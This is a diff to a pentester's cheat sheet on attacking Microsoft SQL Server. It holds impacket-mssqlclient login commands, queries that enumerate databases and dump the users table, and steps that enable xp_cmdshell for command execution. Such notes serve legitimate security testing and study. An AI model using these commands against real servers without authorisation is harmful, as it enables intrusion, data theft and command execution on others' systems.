@@ -2,21 +2,30 @@
 ## Good places and tools
 
 [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
-[Pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
+[Pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet) - ultimate cheatsheet
 
 [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) is A PowerShell Toolkit for Attacking SQL Server
 [PowerUpSQL CheatSheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet) has its own handy cheatsheet.
 
 
 ## Warning
+
 Be careful, you can **block accounts** if you fail login several times using an existing username.
 
 ## Impacket smb related scripts
 
 [[Impacket-Cheatsheet]]; if you have credentials:
 ```bash
-# connect to a Microsoft SQL server
+# Connect to a Microsoft SQL server
 impacket-mssqlclient -port $PORT $domain/$sql_svc 
+# As a user with Windows Authenciation
+impacket-mssqlclient $user:$hostname@$IP -windows-auth
+# Specify a database instance
+-db $database_instance
+# If to are targeting a DC 
+-dc-ip 
+# Do prompt for password
+-no-pass
 ```
 
 ```sql
@@ -26,7 +35,7 @@ SELECT name FROM master..sysdatabases;	-- list databases
 
 SELECT name, database_id, create_date FROM sys.databases;
 
-USE <databasenamegoeshere>
+USE <databasenamegoeshere>;
 SELECT * FROM information_schema.tables;
 SELECT * FROM users;
 
@@ -65,6 +74,10 @@ EXEC sp_configure ‘xp_cmdshell’, 1; -- priv
 RECONFIGURE; -- priv
 -- OR
 EXEC mast.dbo.xp_cmdshell 'cmd';
+-- OR on later versions EXECUTE not EXEC:
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;
 ```
 
 Arbituary File Reading with xp_dirtree
